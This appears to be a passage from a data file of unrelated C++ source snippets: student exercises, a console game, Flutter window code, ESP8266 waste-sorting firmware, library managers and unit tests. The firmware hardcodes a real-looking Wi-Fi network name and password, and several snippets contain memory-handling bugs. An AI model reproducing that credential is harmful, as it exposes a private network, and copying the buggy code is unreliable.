system(\"pause\");\n}\n\nvoid on_illegal_operation()\n{\n    printf(\"\\nIllegal operation \\n\");\n    system(\"pause\");\n}\n\n Byte_Queue *create_queue() // Creates a FIFO byte queue, returning a handle to it.\n{\n    try {\n        return new Byte_Queue(0, {});\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nvoid destroy_queue(Byte_Queue *q) // Destroy an earlier created byte queue.\n{\n    try {\n        delete[] q;\n        q = NULL;\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nvoid enqueue_byte(Byte_Queue *q, unsigned char b) // Adds a new byte to a queue.\n{\n    try {\n        int *temp = new int[q->get_length() + 1];\n\n        for (int i = 0; i < q->get_length(); i++) {\n            temp[i] = q->get_byte(i);\n        }\n\n        temp[q->get_length()] = b;\n\n        q->update_pointer(temp);\n        q->update_length(q->get_length() + 1);\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nchar dequeue_byte(Byte_Queue *q) // Pops the next byte off the FIFO queue.\n{\n    try {\n        if (q->get_length() < 1) {\n            on_illegal_operation();\n        }\n        \n        int *temp = new int[q->get_length() - 1];\n\n        for (int i = 1; i < q->get_length(); i++) {\n            temp[i - 1] = q->get_byte(i);\n        }\n\n        int return_value = q->get_byte(0);\n\n        q->update_pointer(temp);\n        q->update_length(q->get_length() - 1);\n\n        return return_value;\n    }\n    catch (std::bad_alloc) {\n        on_out_of_memory();\n    }\n}\n\nint main()\n{\n    Byte_Queue *q0 = create_queue(); \n    enqueue_byte(q0, 0); \n    enqueue_byte(q0, 1);\n    Byte_Queue *q1 = create_queue();\n    enqueue_byte(q1, 3);\n    enqueue_byte(q0, 2);\n    enqueue_byte(q1, 4);\n    printf(\"%d \", dequeue_byte(q0));\n    printf(\"%d \\n\", dequeue_byte(q0));\n    enqueue_byte(q0, 5);\n    enqueue_byte(q1, 6);\n    printf(\"%d \", dequeue_byte(q0));\n    printf(\"%d \\n\", dequeue_byte(q0));\n    destroy_queue(q0);\n    printf(\"%d \", dequeue_byte(q1));\n    printf(\"%d \", dequeue_byte(q1));\n    printf(\"%d \\n\", dequeue_byte(q1));\n    destroy_queue(q1);\n}\n//\n// 0 1\n// 2 5\n// 3 4 6\n// \n",
    "// this is the simplest type of that can be used .\r\n// it is a compile time cast .\r\n\r\n// can perform conversions between pointers to related classes.\r\n\r\n// from derived to base and from the base to the derived .\r\n// that actually means that static cast supports both upcasting (form derived class pointer to base class pointer )\r\n// and support downcasting (from base class pointer to derived class pointer)\r\n// and that offer flexibility in handling inhertance relationships unlic dynamic cast that only support downcasting .\r\n\r\n// when we use static cast , the compiler ensures that the classes involved are related through inheritance.\r\n// which gurantee some level of comptability between the objects being converted .\r\n// this reduce the risk of invalid conversion .\r\n\r\n// unlike \"dynamic cast\" static cast does not perform runtime type checking to verify if the object being converted is a full object .\r\n// it relies on the progremmers assurance that the conversion is safe .\r\n\r\n// unlike \"dynamic cast\" which incurs runtime type checking overhead static cast bypasses theses checks , \r\n// resulting faster execution , this spped comes with the trade-off of reduced safety guarantees .\r\n\r\n// static cast can also be used to perform any other non-pointer conversion that could also be performed implicitly \r\n// like standard conversion between fundamental types .\r\n\r\n// static cast is able to call the conversion operator of the class if it is defined .\r\n\r\n// syntax of static-cast :\r\n// static_cast <dest_type> (source);\r\n\r\n// so to use static_cast in case of inheritance , the base class must be accessible ",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <filesystem> // Para manejar archivos y directorios\n#include <iomanip> // Para formatear la salida\n#include <stdio.h>\nusing namespace std;\nnamespace fs = std::filesystem;\n\n// Funci\u00f3n para encriptar contenido\nstring encriptar(const string& contenido, const string& clave) {\n    string contenidoEncriptado = contenido;\n    // Algoritmo simple de encriptaci\u00f3n\n    for (size_t i = 0; i < contenidoEncriptado.length(); ++i) {\n        contenidoEncriptado[i] += clave[i % clave.length()];\n    }\n    return contenidoEncriptado;\n}\n\n// Funci\u00f3n para desencriptar contenido\nstring desencriptar(const string& contenidoEncriptado, const string& clave) {\n    string contenidoDesencriptado = contenidoEncriptado;\n    // Algoritmo simple de desencriptaci\u00f3n\n    for (size_t i = 0; i < contenidoDesencriptado.length(); ++i) {\n        contenidoDesencriptado[i] -= clave[i % clave.length()];\n    }\n    return contenidoDesencriptado;\n}\n\nvoid crearArchivo() {\n    string directorio, nombreArchivo, contenido;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    cout << \"Ingrese el contenido del archivo:\" << endl;\n    getline(cin, contenido);\nrename(\"directorio+nombreArchivo\",\"nombreArchivo\");\n    ofstream archivo(rutaArchivo);\n    if (archivo.is_open()) {\n        string contenidoEncriptado = encriptar(contenido, \"clave\"); // Encriptar con clave\n        archivo << contenidoEncriptado << endl;\n        archivo.close();\n        cout << \"Archivo creado exitosamente.\" << endl;\n    } else {\n        cout << \"No se pudo abrir el archivo para escritura.\" << endl;\n    }\n}\n\nvoid leerArchivo() {\n    string directorio, nombreArchivo;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    ifstream archivoEntrada(rutaArchivo);\n    if (archivoEntrada.is_open()) {\n        string linea;\n        while (getline(archivoEntrada, linea)) {\n            string lineaDesencriptada = desencriptar(linea, \"clave\"); // Desencriptar con clave\n            cout << lineaDesencriptada << endl;\n        }\n        archivoEntrada.close();\n    } else {\n        cout << \"No se pudo abrir el archivo para lectura.\" << endl;\n    }\n}\n\nvoid escribirArchivo() {\n    string directorio, nombreArchivo, contenido;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    ofstream archivo(rutaArchivo, ios::app); // Abre el archivo en modo de a\u00f1adir al final\n    if (archivo.is_open()) {\n        cout << \"Ingrese el contenido que desea agregar al archivo:\" << endl;\n        getline(cin, contenido);\n        string contenidoEncriptado = encriptar(contenido, \"clave\"); // Encriptar con clave\n        archivo << contenidoEncriptado << endl;\n        archivo.close();\n        cout << \"Contenido agregado al archivo exitosamente.\" << endl;\n    } else {\n        cout << \"No se pudo abrir el archivo para escritura.\" << endl;\n    }\n}\n\nvoid listarArchivosCreados(const string& directorio) {\n    cout << \"Archivos creados en el directorio '\" << directorio << \"':\" << endl;\n    for (const auto& entry : fs::directory_iterator(directorio)) {\n        if (entry.is_regular_file()) {\n            cout << entry.path().filename() << endl;\n        }\n    }\n}\n\nvoid verContenidoArchivos(const vector<string>& archivos) {\n    for (const auto& archivo : archivos) {\n        cout << \"Contenido del archivo '\" << archivo << \"':\" << endl;\n        ifstream archivoEntrada(archivo);\n        if (archivoEntrada.is_open()) {\n            string linea;\n            while (getline(archivoEntrada, linea)) {\n                string lineaDesencriptada = desencriptar(linea, \"clave\"); // Desencriptar con clave\n                cout << lineaDesencriptada << endl;\n            }\n            archivoEntrada.close();\n        } else {\n            cout << \"No se pudo abrir el archivo para lectura.\" << endl;\n        }\n        cout << \"------------------------------------------\" << endl;\n    }\n}\nvoid mover() {\n    string directorio, nombreArchivo,directorio2;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    cout << \"Ingrese el nuevo directorio del archivo: \";\n    getline(cin, directorio2);\n\n    string rutaArchivo2 = directorio2 + '/' + nombreArchivo;\n\n    // Construye las rutas completas tanto para el antiguo como para el nuevo nombre de archivo\n    string ruta_antiguo = rutaArchivo;\n    s",
    "#include <iostream>\r\n#include <conio.h>\r\n#include <Windows.h>\r\n#include <string>\r\n#include <ctime>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\nstruct Node \r\n{ \r\n    string data;\r\n    Node* next;\r\n};\r\ntypedef Node* NodePtr;\r\n\r\n// Given a reference (pointer to pointer) to the head of a list and an int, inserts a new node on the front of the list. \r\n// Taken from geeksforgeeks.\r\nvoid push(NodePtr& head_ref, string new_data) \r\n{\r\n    NodePtr new_node;\r\n    new_node = new Node;\r\n    new_node->data = new_data;\r\n    new_node->next = head_ref;\r\n    head_ref = new_node;\r\n}\r\n\r\nstring skyGen() \r\n{\r\n    string str(40, ' ');\r\n    int rnd;\r\n    for (int i = 0; i < 2; i++) \r\n    {\r\n        rnd = rand() % 40 + 1;\r\n        if (0 + (rand() % (1 - 0 + 1)) == 1) \r\n            str[rnd] = '$';\r\n        else \r\n            str[rnd] = '.';\r\n    }\r\n    return str;\r\n}\r\n\r\n// Function to remove the last node of the linked list code taken from geeks for geeks https://www.geeksforgeeks.org/remove-last-node-of-the-linked-list/\r\nNodePtr removeLastNode(struct Node* head)\r\n{\r\n    if (head == NULL)\r\n        return NULL;\r\n    if (head->next == NULL) \r\n    {\r\n        delete head;\r\n        return NULL;\r\n    }\r\n    // Find the second last node\r\n    NodePtr second_last = head;\r\n    while (second_last->next->next != NULL)\r\n        second_last = second_last->next;\r\n    // Delete last node\r\n    delete (second_last->next);\r\n    // Change next of second last\r\n    second_last->next = NULL;\r\n    return head;\r\n}\r\n\r\nint main() {\r\n    const char CPPKEYLEFT = 75;    //left arrow\r\n    const char CPPKEYRIGHT = 77;   //right arrow\r\n    srand (time(NULL)); // Keeps the sky generation differently random\r\n    string str(40, ' '), tail;\r\n    NodePtr head = new Node;\r\n\r\n    //initiates the linked list\r\n    for (int i = 0; i < 19; i++) // 19 here dictates the height of our sky\r\n    { \r\n        push(head, str);\r\n    }\r\n\r\n    int score = 50, input, basketPos = 20;\r\n    NodePtr tmp;\r\n\r\n    while (true) \r\n    {\r\n        push(head, skyGen()); // adds a new sky with generated cash or trash\r\n\r\n        tmp = head;\r\n        cout << \"------------- Falling Money --------------\" << endl; \r\n        while(tmp != NULL) \r\n        {\r\n            //block of code for basket movement\r\n            if (kbhit()) input = getch();\r\n            if (input == CPPKEYLEFT && basketPos > 0) \r\n                basketPos--;\r\n            else if (input == CPPKEYRIGHT && basketPos < 39) \r\n                basketPos++;\r\n            input = 0;\r\n            \r\n            // block of code to print out the sky\r\n            if (tmp->next == NULL) {    // specifically enables us to have the basket[U] to be constantly on the bottom\r\n                tail = tmp->data;\r\n\r\n                tail = tmp->data;       // code for checking if the user caught cash or trash\r\n                if (tail[basketPos] == '$') \r\n                    score += 10;\r\n                else if (tail[basketPos] == '.') \r\n                    score -= 15;\r\n\r\n                tail[basketPos] = 'U';\r\n                cout << '|' << tail << '|' << endl;\r\n            }\r\n            else \r\n            {\r\n                cout << '|' << tmp->data << '|' << endl;\r\n            }\r\n            \r\n            tmp = tmp->next;    // moves to the next node\r\n        }\r\n        \r\n        removeLastNode(head);   // removes last node in the linked list thus simulating the falling effect with the help of system(\"cls\");\r\n        cout << \"Your Score: \" << score << endl;\r\n        if (score <= 0) \r\n        { \r\n            cout << \"Sorry, you lose...\";\r\n            Sleep(90);\r\n            return 0;\r\n        } \r\n        else if (score >= 100) \r\n        {\r\n            cout << \"Yeah, you win!!\";\r\n            Sleep(90);\r\n            return 0;\r\n        }\r\n\r\n        Sleep(90);\r\n        system(\"CLS\");\r\n    }\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"pins.h\"\n#include <WifiEspNow.h>\n#include \"ESP8266_ISR_Servo.h\"\n#include <ESP8266WiFi.h>\n\nconst char* ssid = \"SABAKADIHA 2.4\";\nconst char* password = \"Neyney2008@\";\nconst uint8_t PEER[]{0x30, 0xC6, 0xF7, 0x30, 0xBB, 0x39}; // MAC Address Of ESP32\n\nstatic short servoIndex = -1;\nstatic bool isWasteBiodegradable;\nstatic bool isMessageReceived = false;\nstatic bool isAwaitingSegregation = false;\nstatic bool isConnectedToWifi;\n\nbool getInfraredSensorStatus() {\n    int sensorStatus = digitalRead(INFRARED_SENSOR_PIN);\n    if (sensorStatus == 1) {\n        return false;\n    } else {\n        return true;\n    }\n}\n\nbool isWasteInFrontOfCamera() {\n    if (getInfraredSensorStatus() == true) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\nvoid throwWasteIntoBiodegradableBin() {\n    ISR_Servo.setPosition(servoIndex, 20);\n}\n\nvoid throwWasteIntoNonBiodegradableBin() {\n    ISR_Servo.setPosition(servoIndex, 160);\n}\n\nvoid setServoToNeutralPosition() {\n    ISR_Servo.setPosition(servoIndex, 90);\n}\n\nvoid setupServoPins() {\n    servoIndex = ISR_Servo.setupServo(SEGRAGATOR_SERVO_PIN); //TODO: Verify MIN-MAX Pulse Width\n    if (servoIndex == -1) {\n        Serial.println(\"Servo Setup Error!\");\n    } else {\n        setServoToNeutralPosition();\n    }\n}\n\nvoid onMessageReceived(const uint8_t mac[WIFIESPNOW_ALEN], const uint8_t* buf, size_t count, void* arg)\n{   \n    Serial.println();\n    Serial.print(\"Message Received From: \");\n    Serial.printf(\"{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X}\\n\", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n    isMessageReceived = true;\n    if (buf[0] != 0) {\n        // waste is biodegradable\n        isWasteBiodegradable = true;\n    } else {\n        isWasteBiodegradable = false;\n    }\n}\n\nvoid setupESPNOW() {\n    bool ok = WifiEspNow.begin();\n    if (!ok) {\n        Serial.println(\"WifiEspNow.begin() failed\");\n        ESP.restart();\n    }\n\n    WifiEspNow.onReceive(onMessageReceived, nullptr);\n\n    ok = WifiEspNow.addPeer(PEER);\n    if (!ok) {\n        Serial.println(\"WifiEspNow.addPeer() failed\");\n        ESP.restart();\n    }\n}\n\nvoid printMacAddress() {\n    Serial.print(\"MAC address of this node is \");\n    Serial.println(WiFi.softAPmacAddress());\n\n    uint8_t mac[6];\n    WiFi.softAPmacAddress(mac);\n    Serial.println();\n    Serial.println(\"You can paste the following into the program for the other device:\");\n    Serial.printf(\"static uint8_t PEER[]{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X};\\n\", mac[0],\n                    mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n}\n\nvoid blinkLED() {\n  digitalWrite(LED_BUILTIN, HIGH); // OFF\n  delay(500);\n  digitalWrite(LED_BUILTIN, LOW); // ON\n  delay(1000);\n  digitalWrite(LED_BUILTIN, HIGH); // OFF\n  delay(500);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println();\n\n    setupServoPins();\n    pinMode(INFRARED_SENSOR_PIN, INPUT);\n    pinMode(LED_BUILTIN, OUTPUT);\n\n    WiFi.persistent(false);\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(ssid, password);\n    if (WiFi.waitForConnectResult() != WL_CONNECTED) {\n        Serial.printf(\"WiFi failure; Status: %d\\n\", WiFi.status());\n        isConnectedToWifi = false;\n    } else {\n        // WiFi Connection Successful\n        Serial.printf(\"WiFi success; Status: %d\\n\", WiFi.status());\n        isConnectedToWifi = true;\n        WiFi.softAP(\"ESPNOW\", nullptr, 3);\n        WiFi.softAPdisconnect(false);\n        printMacAddress();\n        setupESPNOW();\n    }\n    blinkLED();\n}   \n\nvoid checkForWastePresenceAndInformESP32() {\n    if (isWasteInFrontOfCamera() == true) {\n        Serial.println(\"Waste In Front Of Camera: True\");\n        byte data[1];\n        data[0] = true;\n        if (isAwaitingSegregation == false) {\n            if (WifiEspNow.send(PEER, data, sizeof(data)) == true) {\n                isAwaitingSegregation = true;\n                Serial.println(\"Successfully Informed PEER\");\n            } else {\n                Serial.println(\"Failed To Inform Peer\");\n            }\n        }\n    } else {\n        Serial.println(\"Waste In Front Of Camera: False\");\n    }\n}\n\nvoid segregateWaste() {\n    if (isMessageReceived == true) {\n        if (isWasteBiodegradable == true) {\n            Serial.println(\"Waste Is Biodegradable\");\n            throwWasteIntoBiodegradableBin();\n        } else {\n            Serial.println(\"Waste Is Non-Biodegradable\");\n            throwWasteIntoNonBiodegradableBin();\n        }\n        isMessageReceived = false;\n        delay(5000);\n        isAwaitingSegregation = false;\n        setServoToNeutralPosition();\n    }\n}\n\nvoid testServos() {\n    if (isWasteInFrontOfCamera() == true) {\n        throwWasteIntoBiodegradableBin();\n        delay(2500);\n        throwWasteIntoNonBiodegradableBin();\n        delay(2500);\n        setServoToNeutralPosition();\n        delay(2500);\n    }\n}\n\nvoid loop() {\n    if (isConnectedToWifi == true) {\n        checkForWastePresenceAndInformESP32();\n        segregateWaste();\n    } else {\n        testServos();\n    }",
    "    #include <iostream>\n    #include <string>\n    #include <vector>\n\n    using namespace std;\n\n    class HomeLibraryBook;\n\n    class Book {\n    protected:\n        string author;\n        string title;\n        int pages;\n        int year;\n\n    public:\n        Book() : author(\"\"), title(\"\"), pages(0), year(0) {}\n\n        Book(const string& author, const string& title, int pages, int year)\n            : author(author), title(title), pages(pages), year(year) {}\n\n        virtual ~Book() {}\n\n        virtual void display() const {\n            cout << \"Author: \" << author << endl;\n            cout << \"Title: \" << title << endl;\n            cout << \"Pages: \" << pages << endl;\n            cout << \"Year: \" << year << endl;\n        }\n\n        const string& getTitle() const { return title; }\n    };\n\n    class HomeLibraryBook : public Book {\n    private:\n        string location;\n        bool borrowed;\n\n    public:\n        HomeLibraryBook(const string& author, const string& title, int pages, int year,\n                        const string& location, bool borrowed)\n            : Book(author, title, pages, year), location(location), borrowed(borrowed) {}\n\n        virtual void display() const override {\n            Book::display();\n            cout << \"Location: \" << location << endl;\n            cout << \"Borrowed: \" << (borrowed ? \"Yes\" : \"No\") << endl;\n        }\n\n        void borrow() {\n            borrowed = true;\n        }\n\n        void returnBook() {\n            borrowed = false;\n        }\n    };\n\n    class HomeLibrary {\n    private:\n        vector<HomeLibraryBook> books;\n\n    public:\n        void addBook(const HomeLibraryBook& book) {\n            books.push_back(book);\n        }\n\n        void removeBook(const string& title) {\n            for (auto it = books.begin(); it != books.end(); ++it) {\n                if (it->getTitle() == title) {\n                    books.erase(it);\n                    break;\n                }\n            }\n        }\n\n        void displayAllBooks() const {\n            for (const auto& book : books) {\n                book.display();\n                cout << endl;\n            }\n        }\n    };\n\n    int main() {\n        HomeLibrary library;\n\n        HomeLibraryBook myBook(\"John Doe\", \"C++ Programming\", 350, 2020, \"Living Room\", false);\n        library.addBook(myBook);\n\n        HomeLibraryBook myBook2(\"Penelope Sky\", \"Buttons and Lace\", 350, 2016, \"Living Room\", false);\n        library.addBook(myBook2);\n\n        library.displayAllBooks();\n\n        myBook.borrow();\n        cout << \"Book borrowed.\" << endl;\n        library.displayAllBooks();\n\n        return 0;\n    }\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nconst int MOD = 1e9 + 7;\n\nvector<vector<int>> dp(105, vector<int>(105, -1));\n\nint solve(int i, int j, vector<int> &boys, vector<int> &girls) {\n    if(i == boys.size()) {\n        return 0;\n    }\n    if(j == girls.size()) {\n        return 0;\n    }\n    if(dp[i][j] != -1) {\n        return dp[i][j];\n    }\n    int op1 = (abs(boys[i] - girls[j]) <= 1) ? (1%MOD + solve(i+1, j+1, boys, girls)%MOD)%MOD : 0;\n    int op2 = solve(i, j+1, boys, girls);\n    int op3 = solve(i+1, j, boys, girls);\n    return dp[i][j] = max(op1, max(op2, op3));\n}\n\nint main() {\n    int n;\n    cin>>n;\n    vector<int> boys(n);\n    for(int i=0; i<n; i++) {\n        cin>>boys[i];\n    }\n    int m;\n    cin>>m;\n    if(n <= 0) {\n        cout << 0 << '\\n';\n        return 0;\n    }\n    if(m <= 0) {\n        cout << 0 << '\\n';\n        return 0;\n    }\n    vector<int> girls(m);\n    for(int i=0; i<m; i++) {\n        cin>>girls[i];\n    }\n    sort(boys.begin(), boys.end());\n    sort(girls.begin(), girls.end());\n    cout << solve(0, 0, boys, girls);\n}\n",
    "#include \"testes.h\"\n\n//---------------------------TesteUnitariosDasClassesDominio------------------\n\n//---------------------------TesteUnitarioCodigoPagamento------------------\nconst string TUCodigoDePagamento::VALOR_VALIDO = \"3423453543\";\nconst string TUCodigoDePagamento::VALOR_INVALIDO = \"0324321299\";\n\nvoid TUCodigoDePagamento::setUp() {\n    codigoDePagamento = new CodigoDePagamento();\n    estado = SUCESSO;\n}\n\nvoid TUCodigoDePagamento::tearDown() {\n    delete codigoDePagamento;\n}\n\nvoid TUCodigoDePagamento::testarCenarioSucesso() {\n    try {\n        codigoDePagamento->setCodigoPagamento(VALOR_VALIDO);\n        if(codigoDePagamento->getCodigoPagamento() != VALOR_VALIDO)\n            estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        estado = FALHA;\n    }\n}\n\nvoid TUCodigoDePagamento::testarCenarioFalha() {\n    try {\n        codigoDePagamento->setCodigoPagamento(VALOR_INVALIDO);\n        estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        if(codigoDePagamento->getCodigoPagamento() == VALOR_INVALIDO)\n            estado = FALHA;\n    }\n}\n\nint TUCodigoDePagamento::run() {\n    setUp();\n    testarCenarioSucesso();\n    testarCenarioFalha();\n    tearDown();\n    return estado;\n}\n//---------------------------TesteUnitarioCodigoDeTitulo------------------\nconst string TUCodigoDeTitulo::VALOR_VALIDO = \"CDB3424A2343\";\nconst string TUCodigoDeTitulo::VALOR_INVALIDO = \"CCC234234558\";\n\nvoid TUCodigoDeTitulo::setUp() {\n    codigoDeTitulo = new CodigoDeTitulo();\n    estado = SUCESSO;\n}\n\nvoid TUCodigoDeTitulo::tearDown() {\n    delete codigoDeTitulo;\n}\n\nvoid TUCodigoDeTitulo::testarCenarioSucesso() {\n    try {\n        codigoDeTitulo->setCodigoTitulo(VALOR_VALIDO);\n        if(codigoDeTitulo->getCodigoTitulo() != VALOR_VALIDO)\n            estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        estado = FALHA;\n    }\n}\n\nvoid TUCodigoDeTitulo::testarCenarioFalha() {\n    try {\n        codigoDeTitulo->setCodigoTitulo(VALOR_INVALIDO);\n        estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        if(codigoDeTitulo->getCodigoTitulo() == VALOR_INVALIDO)\n            estado = FALHA;\n    }\n}\n\nint TUCodigoDeTitulo::run() {\n    setUp();\n    testarCenarioSucesso();\n    testarCenarioFalha();\n    tearDown();\n    return estado;\n}\n\n//---------------------------TesteUnitarioCpf------------------\nconst string TUCpf::VALOR_VALIDO = \"123.456.789-09\";\nconst string TUCpf::VALOR_INVALIDO = \"5042-2131-434-23\";\n\nvoid TUCpf::setUp() {\n    cpf = new Cpf();\n    estado = SUCESSO;\n}\n\nvoid TUCpf::tearDown() {\n    delete cpf;\n}\n\nvoid TUCpf::testarCenarioSucesso() {\n    try {\n        cpf->setCpf(VALOR_VALIDO);\n        if(cpf->getCpf() != VALOR_VALIDO)\n            estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        estado = FALHA;\n    }\n}\n\nvoid TUCpf::testarCenarioFalha() {\n    try {\n        cpf->setCpf(VALOR_INVALIDO);\n        estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        if(cpf->getCpf() == VALOR_INVALIDO)\n            estado = FALHA;\n    }\n}\n\nint TUCpf::run() {\n    setUp();\n    testarCenarioSucesso();\n    testarCenarioFalha();\n    tearDown();\n    return estado;\n}\n\n//---------------------------TesteUnitarioData------------------\nconst string TUData::VALOR_VALIDO = \"01-10-2010\";\nconst string TUData::VALOR_INVALIDO = \"00-00-0000\";\n\nvoid TUData::setUp() {\n    data = new Data();\n    estado = SUCESSO;\n}\n\nvoid TUData::tearDown() {\n    delete data;\n}\n\nvoid TUData::testarCenarioSucesso() {\n    try {\n        data->setData(VALOR_VALIDO);\n        if(data->getData() != VALOR_VALIDO)\n            estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        estado = FALHA;\n    }\n}\n\nvoid TUData::testarCenarioFalha() {\n    try {\n        data->setData(VALOR_INVALIDO);\n        estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        if(data->getData() == VALOR_INVALIDO)\n            estado = FALHA;\n    }\n}\n\nint TUData::run() {\n    setUp();\n    testarCenarioSucesso();\n    testarCenarioFalha();\n    tearDown();\n    return estado;\n}\n\n\n//---------------------------TesteUnitarioDinheiro------------------\nconst string TUDinheiro::VALOR_VALIDO = \"10000000\";\nconst string TUDinheiro::VALOR_INVALIDO = \"-1000000\";\n\nvoid TUDinheiro::setUp() {\n    dinheiro = new Dinheiro();\n    estado = SUCESSO;\n}\n\nvoid TUDinheiro::tearDown() {\n    delete dinheiro;\n}\n\nvoid TUDinheiro::testarCenarioSucesso() {\n    try {\n        dinheiro->setDinheiro(VALOR_VALIDO);\n        if(dinheiro->getDinheiro() != VALOR_VALIDO)\n            estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        estado = FALHA;\n    }\n}\n\nvoid TUDinheiro::testarCenarioFalha() {\n    try {\n        dinheiro->setDinheiro(VALOR_INVALIDO);\n        estado = FALHA;\n    }\n    catch(invalid_argument &excecao) {\n        if(dinheiro->getDinheiro() == VALOR_INVALIDO)\n            estado = FALHA;\n    }\n}\n\nint TUDinheiro::run() {\n    setUp();\n    testarCenarioSucesso();\n    testarCenarioFalha();\n    tearDown();\n    return estado;\n}\n\n//-",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm> // For find\n\nusing namespace std;\n\n// Book structure\nstruct Book {\n    string title;\n    string author;\n    int ISBN;\n    bool available;\n};\n\n// Member structure\nstruct Member {\n    string name;\n    int memberID;\n    vector<int> borrowedBooks; // Stores ISBNs of borrowed books\n};\n\n// Global vectors for storing books and members\nvector<Book> books;\nvector<Member> members;\n\n// Function prototypes\nvoid addBook();\nvoid issueBook();\nvoid returnBook();\nvoid searchBooks();\nvoid displayAllBooks();\nvoid addMember();\nvoid displayAllMembers();\nvoid saveDataToFile();\nvoid loadDataFromFile();\n\nint main() {\n    loadDataFromFile(); // Load data on startup\n\n    int choice;\n\n    do {\n        cout << \"\\nLibrary Management System\\n\";\n        cout << \"1. Add Book\\n\";\n        cout << \"2. Issue Book\\n\";\n        cout << \"3. Return Book\\n\";\n        cout << \"4. Search Books\\n\";\n        cout << \"5. Display All Books\\n\";\n        cout << \"6. Add Member\\n\";\n        cout << \"7. Display All Members\\n\";\n        cout << \"8. Save Data\\n\"; // Option to save data\n        cout << \"0. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: addBook(); break;\n            case 2: issueBook(); break;\n            case 3: returnBook(); break;\n            case 4: searchBooks(); break;\n            case 5: displayAllBooks(); break;\n            case 6: addMember(); break;\n            case 7: displayAllMembers(); break;\n            case 8: saveDataToFile(); break;\n            case 0: cout << \"Exiting...\\n\"; break;\n            default: cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 0);\n\n    saveDataToFile(); // Save data on exit\n    return 0;\n}\n\n// Function definitions\nvoid addBook() {\n    Book book;\n    cout << \"Enter Book Title: \";\n    cin.ignore(); // Clear input buffer\n    getline(cin, book.title);\n    cout << \"Enter Author: \";\n    getline(cin, book.author);\n    cout << \"Enter ISBN: \";\n    cin >> book.ISBN;\n    book.available = true;\n    books.push_back(book);\n    cout << \"Book added successfully!\\n\";\n}\n\nvoid issueBook() {\n    int ISBN, memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to issue: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN && books[i].available) {\n            foundBook = true;\n            \n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find 